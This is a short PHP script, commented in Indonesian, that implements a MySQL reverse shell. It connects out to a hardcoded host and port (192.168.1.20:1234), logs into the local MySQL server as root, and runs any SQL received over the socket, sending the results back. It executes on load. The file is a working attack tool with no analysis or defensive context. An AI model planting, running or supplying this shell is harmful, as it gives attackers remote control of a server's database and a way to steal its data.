<?php
class MySQLReverseShell {
    private $addr;
    private $port;
    private $socket;
    private $conn;

    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }

    public function run() {
        // Membuka koneksi socket
        $this->socket = @fsockopen($this->addr, $this->port);
        if (!$this->socket) {
            echo "Unable to connect to the socket.";
            return;
        }
        fwrite($this->socket, "Connected to the reverse shell.\n");

        // Koneksi ke MySQL
        $host = "localhost";
        $user = "root";
        $password = ""; // Masukkan password root Anda
        $this->conn = new mysqli($host, $user, $password);
        if ($this->conn->connect_error) {
            fwrite($this->socket, "MySQL Connection Failed: " . $this->conn->connect_error . "\n");
            return;
        } else {
            fwrite($this->socket, "MySQL Connected!\n");
        }

        // Loop untuk menerima perintah dari socket
        while (!feof($this->socket)) {
            $command = fgets($this->socket);
            if ($command !== false) {
                $command = trim($command);
                if ($command === "exit") {
                    fwrite($this->socket, "Disconnecting...\n");
                    break;
                }
                if (!empty($command)) {
                    $this->executeCommand($command);
                }
            }
        }

        $this->closeConnections();
    }

    private function executeCommand($command) {
        $result = $this->conn->query($command);
        if ($result === true) {
            fwrite($this->socket, "Command executed successfully.\n");
        } elseif ($result) {
            while ($row = $result->fetch_assoc()) {
                fwrite($this->socket, implode(" | ", $row) . "\n");
            }
            $result->free();
        } else {
            fwrite($this->socket, "Command Failed: " . $this->conn->error . "\n");
        }
    }

    private function closeConnections() {
        $this->conn->close();
        fclose($this->socket);
    }
}

$sh = new MySQLReverseShell('192.168.1.20', 1234); // Ganti dengan IP dan port yang sesuai
$sh->run();
?>
